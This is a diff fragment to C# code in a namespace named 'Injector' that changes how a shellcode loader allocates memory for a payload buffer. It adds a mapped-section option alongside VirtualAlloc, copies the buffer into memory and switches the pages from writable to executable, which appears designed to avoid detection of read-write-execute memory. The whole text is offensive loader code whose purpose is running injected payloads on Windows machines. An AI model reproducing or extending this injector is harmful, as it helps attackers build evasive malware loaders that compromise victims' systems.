@@ -20,12 +20,7 @@ namespace Injector {
                     uint perm = PAGE_EXECUTE_READWRITE;
                 #endif
                 IntPtr baseAddr = VirtualAlloc(0, (UInt32)Global.my_buf.Length, MEM_COMMIT, perm);
-            #else
-                #if RX
-                    uint perm = Natives.PAGE_READWRITE;
-                #else
-                    uint perm = Natives.PAGE_EXECUTE_READWRITE;
-                #endif
+            #elif MAPVIEWOFSECTION
                 Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
                 largeinteger.LowPart = (uint)Global.my_buf.Length;
                 IntPtr section = IntPtr.Zero;
@@ -70,6 +65,14 @@ namespace Injector {
                 #if _DEBUG_
                     Console.WriteLine("Mapped view of section @ 0x{0:x}", baseAddr);
                 #endif
+            #else
+                #if RX
+                    uint perm = Natives.PAGE_READWRITE;
+                #else
+                    uint perm = Natives.PAGE_EXECUTE_READWRITE;
+                #endif
+
+                IntPtr baseAddr = Natives.VirtualAlloc(0, (UInt32)Global.my_buf.Length, Natives.MEM_COMMIT, perm);
             #endif
 
             // equivalent to: Marshal.Copy(Global.my_buf, 0, baseAddr, Global.my_buf.Length);
@@ -80,12 +83,12 @@ namespace Injector {
                 }
             }
 
-            #if RX
+            #if RX && !MAPVIEWOFSECTION
                 uint old = 0;
                 #if PINVOKE
                     VirtualProtectEx((IntPtr)(-1), baseAddr, (UIntPtr)Global.my_buf.Length, PAGE_EXECUTE_READ, ref old);
                 #else
-                    Natives.VirtualProtect(baseAddr, (UIntPtr)Global.my_buf.Length, Natives.PAGE_EXECUTE_READ, out old);
+                    Natives.VirtualProtectEx((IntPtr)(-1), baseAddr, (UIntPtr)Global.my_buf.Length, Natives.PAGE_EXECUTE_READ, out old);
                 #endif
             #endif
 
